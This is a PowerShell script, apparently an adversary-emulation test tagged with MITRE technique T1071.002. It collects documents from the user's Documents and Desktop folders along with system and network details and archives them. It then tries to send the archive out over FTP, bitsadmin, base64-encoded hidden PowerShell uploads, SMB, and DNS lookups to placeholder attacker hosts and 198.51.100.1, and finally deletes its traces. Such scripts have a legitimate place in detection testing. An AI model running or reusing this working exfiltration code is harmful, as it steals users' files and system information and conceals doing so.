Write-Host "[T1071.002] Data Exfiltration via FTP/TFTP/SMB" -ForegroundColor Red

$stagingDir = "$env:TEMP\exfil_$((Get-Random -Max 9999))"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null

Write-Host "[1] Staging sensitive documents..."
Get-ChildItem "$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop" -Recurse -Include "*.docx","*.xlsx","*.pdf","*.csv" -ErrorAction SilentlyContinue | Select-Object -First 5 | ForEach-Object {
    Copy-Item $_.FullName $stagingDir -Force -ErrorAction SilentlyContinue
    Write-Host "    Staged: $($_.Name)" -ForegroundColor Yellow
}
& systeminfo.exe 2>&1 | Out-File (Join-Path $stagingDir "sysinfo.txt")
& ipconfig.exe /all 2>&1 | Out-File (Join-Path $stagingDir "network.txt")

$archive = "$env:TEMP\backup_$(Get-Date -Format 'yyyyMMdd').zip"
Compress-Archive -Path "$stagingDir\*" -DestinationPath $archive -Force
Write-Host "[+] Archive: $archive ($((Get-Item $archive -ErrorAction SilentlyContinue).Length) bytes)" -ForegroundColor Yellow

Write-Host "[2] FTP exfil via ftp.exe..."
@"
open ftp.evil-exfil-server.com
anonymous
anonymous@
binary
put $archive
quit
"@ | Out-File "$env:TEMP\ftp.txt" -Encoding ASCII
& ftp.exe -s:"$env:TEMP\ftp.txt" 2>&1

Write-Host "[3] certutil encode + bitsadmin upload..."
& certutil.exe -encode $archive "$env:TEMP\encoded.b64" 2>&1
& bitsadmin.exe /transfer exfil /upload "http://198.51.100.1/upload" $archive 2>&1

Write-Host "[4] PowerShell WebClient upload..."
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("try{(New-Object Net.WebClient).UploadFile('http://198.51.100.1/exfil','$archive')}catch{}"))
& powershell.exe -NoProfile -NonInteractive -EncodedCommand $enc 2>&1

Write-Host "[5] SMB to external..."
& net.exe use \\198.51.100.1\share 2>&1
& copy "$archive" "\\198.51.100.1\share\" 2>&1

Write-Host "[6] DNS exfil pattern..."
$data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$env:COMPUTERNAME|$env:USERNAME|$env:USERDNSDOMAIN"))
$chunks = $data -split '(.{50})' | Where-Object { $_ }
foreach ($c in ($chunks | Select-Object -First 5)) {
    & nslookup.exe "$c.exfil.evil-server.com" 2>&1 | Out-Null
    Write-Host "    DNS: $c.exfil.evil-server.com" -ForegroundColor Yellow
}

Write-Host "[7] Invoke-WebRequest POST exfil..."
$enc2 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("try{Invoke-WebRequest -Uri 'http://198.51.100.1/collect' -Method POST -InFile '$archive' -UseBasicParsing}catch{}"))
& powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand $enc2 2>&1

Write-Host "[*] Cleanup..."
Remove-Item $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $archive,"$env:TEMP\ftp.txt","$env:TEMP\encoded.b64" -Force -ErrorAction SilentlyContinue

Write-Host "[T1071.002] Done." -ForegroundColor Cyan
